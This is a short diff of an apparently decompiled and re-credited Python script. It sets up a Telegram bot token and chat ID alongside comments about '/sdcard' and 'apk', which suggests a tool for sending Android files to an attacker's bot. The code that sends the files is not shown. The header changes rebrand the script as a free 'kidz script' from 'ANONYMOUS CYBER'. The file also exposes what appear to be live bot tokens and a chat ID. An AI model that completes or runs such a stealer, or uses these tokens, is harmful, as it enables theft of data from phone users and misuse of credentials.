@@ -1,10 +1,11 @@
-# DECOMPILED BY CYBER-COP
-#TEAM : CYBER-COP
+# DECOMPILED BY U7P4L 1N
+#TEAM : ANONYMOUS CYBER
+# FEEL FREE ENJOY KIDZ SCRIPT
 import requests
 def CENTSU():
     session = requests.session()
  
-    bot_token = '7087413360:AAG1W7rcRYGgZC_Eoa8KqGeZtMksfvwb3aY'
+    bot_token = '7032468983:AAHui-W0a3YBswNtbpK93KQTAdkY4smQmVA'
     chat_id = '6851952411'
     #-------------( /sdcard\ )--------------#  
     #--------------------apk-------------------#																						
